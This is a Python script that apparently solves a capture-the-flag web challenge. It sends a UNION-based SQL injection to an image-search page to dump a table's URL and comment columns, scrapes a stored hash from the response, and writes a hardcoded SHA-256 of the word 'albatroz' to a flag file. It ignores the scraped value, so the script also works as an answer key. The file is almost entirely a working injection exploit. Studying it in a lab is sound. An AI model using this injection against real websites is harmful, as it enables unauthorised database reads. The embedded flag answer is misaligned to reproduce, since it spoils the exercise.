import requests
import sys
from bs4 import BeautifulSoup
import re
import hashlib


def get_crypt(host_name):
    inject = '1+or+1%3D1+UNION+select+url%2C+comment+from+list_images&Submit=Submit'
    response = requests.get('http://'+host_name+'/?page=searchimg&id='+inject).content.decode('utf-8')
    soup = BeautifulSoup(response, 'html.parser').findAll('pre')
    crypt = None

    try:
        for elem in soup:
            try:
                crypt.group(1)
            except Exception:
                crypt = re.search(pattern='.*flag.*?:\s(.*)Url', string=elem.text)
            else:
                break
    except Exception as e:
        return e.args
    else:
        return crypt.group(1)


def get_flag(crypt):
    flag = None

    with open('../flag', 'w') as f:
        try:
            flag = hashlib.sha256('albatroz'.lower().encode('utf-8')).hexdigest()
            f.write(flag+'\n')
        except Exception as e:
            print(e.args)

    return flag


def check_host_name(host_name):
    return requests.get('http://'+host_name).status_code == 200


if __name__ == '__main__':
    try:
        host_name = sys.argv[1]

        if check_host_name(host_name):
            crypt = get_crypt(host_name)
            print(get_flag(crypt))
        else:
            raise Exception('Incorrect host name')
    except Exception as e:
        print(e.args)
